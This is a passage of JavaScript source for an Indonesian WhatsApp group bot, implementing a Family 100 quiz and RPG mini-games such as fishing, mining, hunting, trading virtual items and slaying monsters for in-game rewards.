break
case 'family100': case 'f100':
//if(!isGroup) return onlyGroup()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await reply795(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
reply795(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break //Powered By znn & znn

































//FITUR RPG GAMES
case 'joinrpg':{
if (!m.isGroup) return onlyGroup()
if (isPetualang) return reply('Kamu Telah join sebelumnya')
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
_petualang.push(m.sender)
addInventoriDarah(m.sender, DarahAwal)
addInventori(m.sender)
addInventoriBuruan(m.sender)
fs.writeFileSync('./database/rpg/inventory.json', JSON.stringify(_petualang))
addLevelingId(m.sender) 
let itu = 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg'
znn.sendMessage(m.chat, {image:{url: itu}, caption: 'Sukses join Rpg games' }, {quoted:m})
}
break
case 'mancing':{
if (!m.isGroup) return reply('[ System Notice ] Only for group')
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
setTimeout( () => {
const fishing = Math.ceil(Math.random() * 10)
addIkan(m.sender, fishing)
reply(`*FISH FISHED* kamu mendapatkan *${fishing}* Ikan selama 1 menit`)
}, 60000); //2 minute
setTimeout( () => {
reply('Ikannya Terpancing!..' )
}, 20000) // 1000 = 1s,
setTimeout( () => {
reply('🎣 Menarik Kail. . .' )
}, 7000) // 1000 = 1s,
setTimeout( () => {
let mancingnya = 'https://telegra.ph/file/4cc0b6bd2827a9b23a189.mp4'
znn.sendMessage(from, {video: {url:mancingnya}, caption: 'mulai memancing', gifPlayback: true},{quoted:m})
}, 0) // 1000 = 1s,
}
break
case 'inv': case 'me': case 'inventori': case 'inventory': case 'profile':{
if(!isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `*INFO USER*\n\n`
 teksehmazeh += `*📝 Name* : ${pushname}\n`
 teksehmazeh += `*📱 Number* : ${nomore}\n`
 teksehmazeh += `*👩‍⚕️ Premium* : ${isPremium ? 'Premium':'Free'}\n`
 teksehmazeh += `*🎟️ Limit* : ${limit}\n`
 teksehmazeh += `*🕺🏻 Petualang* : ${isPetualang ? 'Petualang':'Bukan Petualang'}\n\n`
 teksehmazeh += `*RPG USER*\n\n`
 teksehmazeh += `*❤️ Blood* : ${getDarah(m.sender) ? getDarah(m.sender) : 0}\n`
 teksehmazeh += `*◻️️ Iron* : ${getBesi(m.sender) ? getBesi(m.sender) : 0}\n`
 teksehmazeh += `*🌟 Gold* : ${getEmas(m.sender) ? getEmas(m.sender) : 0}\n`
 teksehmazeh += `*🐲 Emerald* : ${getEmerald(m.sender) ? getEmerald(m.sender) : 0}\n`
 teksehmazeh += `*💎 Diamond* : ${getDm(m.sender) ? getDm(m.sender) : 0}\n`
 teksehmazeh += `*⏺️ Limit* : ${isCreator ? 'Unlimited' : isPremium ? 'Unlimited' : getLimit(m.sender, limitCount, limit)}\n`
 teksehmazeh += `*💰 Money* : $${getBalance(m.sender, balance) ? getBalance(m.sender, balance) : 0}\n`
 teksehmazeh += `*💵 Saldo* :  Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}\n`
 teksehmazeh += `*🧪 Potion* : ${getPotion(m.sender) ? getPotion(m.sender) : 0}\n\n`
 teksehmazeh += `*HUNT RESULT*\n`
 teksehmazeh += `*🐟 Fish* :` + util.format(getIkan(m.sender) ? getIkan(m.sender) : 0 + getMancingIkan(m.sender) ? getMancingIkan(m.sender) :0) + `\n`
 teksehmazeh += `*🐔 Chicken* : ${getAyam(m.sender) ? getAyam(m.sender) : 0}\n`
 teksehmazeh += `*🐇 Rabbit* : ${getKelinci(m.sender) ? getKelinci(m.sender) : 0}\n`
 teksehmazeh += `*🐑 Sheep* : ${getDomba(m.sender) ? getDomba(m.sender) : 0}\n`
 teksehmazeh += `*🐄 Cow* : ${getSapi(m.sender) ? getSapi(m.sender) : 0}\n`
 teksehmazeh += `*🐘 Elephant* : ${getGajah(m.sender) ? getGajah(m.sender) : 0}\n`
 teksehmazeh += `🎢 *Coal* : ${getMiningcoal(m.sender) ? getMiningcoal(m.sender) : 0}\n`
 teksehmazeh += `🛑 *Stone* : ${getMiningstone(m.sender) ? getMiningstone(m.sender) : 0}\n`
 teksehmazeh += `❄️ *Copper Ore* : ${getMiningore(m.sender) ? getMiningore(m.sender) : 0}\n`
 teksehmazeh += `🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n`
 teksehmazeh += `🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
await znn.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {  
title: `${pushname} PROFILE & BAG`, 
body: 'Play RPG Games With Your Friends',
thumbnailUrl: ppnyauser,
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
break
case 'mining': case 'mine':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await znn.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted: m})
}, 7000)
setTimeout( async () => {
await znn.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break
case 'beli': case 'buy':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!text) return reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return reply(`Example : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return reply(`Example : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return reply(`Example : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 kurangMonay(m.sender, noh)
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( async() => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { 
 reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)}
 }
 break
case 'sell': case 'sel': case 'jual':{
 if(!isGroup) return onlyGroup()
if (!isPetualang) return reply795('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 1500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 2500 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
 reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 3000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
let monaynya = 5000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return reply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( async () => {
reply(`Transaksi berhasil ✅\n*Sisa uang* : ${getMonay(m.sender)}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }

 }
 break
case 'heal':{
 
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!isCekDarah < 1) return reply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
if (isCekDarah > 100) return reply('Darahmu Penuh')
if (isPotion < 1) return reply(`Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 reply('Done! Darah mu dah full')
 }
 break
case 'hunt': case 'hunting': {
if(!isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return reply('Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan') 
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
 teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
await znn.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
znn.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
case 'adventure':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* $${money}\n ┊ *EXP :* ${adven}Xp`
znn.sendMessage(m.chat, {image:{url:hasm}, caption: hg},{quoted:m})
}, 7000)
setTimeout( () => {
reply(`Awass`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
reply(`Tiba-tiba Ada ${sesuatu}`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
reply(`${pushname} On an Adventure`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'ojek': case 'ngojek':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `
*—[ Hasil Ngojek ${pushname} ]—*
 ➕ 💹 Uang = [ ${money} ]
 ➕ ✨ Exp = [ ${adven} ]	 
 ➕ 😍 Order Selesai = +1
`
reply(hg)
}, 10000)
setTimeout( () => {
reply(`
➕ 💹Menerima gaji....
`)
}, 9000)
setTimeout( () => {
reply(`
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Sampai di tujuan...
`)
}, 7000)
setTimeout( () => {
reply(`
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       


➕ Mengantar ke tujuan....
`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
reply(`
Mendapatkan Orderan...
`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
reply(`Mencari Pelanggan...`)
}, 0) // 1000 = 1s,
addLevelingXp(m.sender, adven)
addBalance(m.sender, money, balance)
}
break
case 'luckyday':
case 'luckytime':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
addBalance(m.sender, b, balance)
addLevelingXp(m.sender, ez)
addEmas(m.sender, a)
addBesi(m.sender, c)
reply(`🎰 *Lucky*\n┊ *Money:* $${b}\n┊ *Gold :* ${a}\n┊ *Iron :* ${c}\n┊ *XP :* ${ez}`)
}
break
case 'slime':
case 'killslime':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 400)
addLevelingXp(m.sender, ez)
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufutI = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
znn.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break
case 'goblin':
case 'killgoblin':{
 
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 500)
addLevelingXp(m.sender, ez)
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
znn.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break
case 'devil':
case 'killdevil':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 600)
addLevelingXp(m.sender, ez)
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
znn.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break
case 'behemoth':
case 'killbehemoth':{
 
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 700)
addLevelingXp(m.sender, ez)
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
znn.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break
case 'demon':
case 'killdemon':{
 
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 850)
addLevelingXp(m.sender, ez)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
addLevelingXp(m.sender, ez)
addBalance(m.sender, b, balance)
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *Diamond:* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
znn.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break
case 'demonking':
case 'killdemonking':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 1000)
addLevelingXp(m.sender, ez)
addBalance(m.sender, 1999, balance)
addEmas(m.sender, 99)
addBesi(m.sender, 99)
addDm(m.sender, 99)
bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : $${b}\n ┊ *Iron :* ${c}\n ┊ *Gold :* ${a}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
znn.sendMessage(m.chat, {image:{url: bhuud}, caption: hg }, {quoted:m})
}
break
case 'sellikan':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 5 * jmlh
if (getFish(m.sender) < jmlh) return reply(`*Ikan Anda Tidak Cukup*`)
sellFish(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
reply(`🛍️ *MARKET*\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Price/Fish : 5\n ┊ Status : Success\n ┊ Left FishPrice/Fish : ${await getFish(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellbesi':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 10 * jmlh
if (getBesi(m.sender) < jmlh) return reply(`Besi Tidak Cukup`)
sellBesi(m.sender, jmlh, balance)
addBalance(m.sender, rp, balance) 
reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Besi : 10\n ┊ Status : Sukses\n ┊ Sisa Besi : ${await getBesi(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellemas':{
if (!m.isGroup) return onlyGroup()
if (!isPetualang) return reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
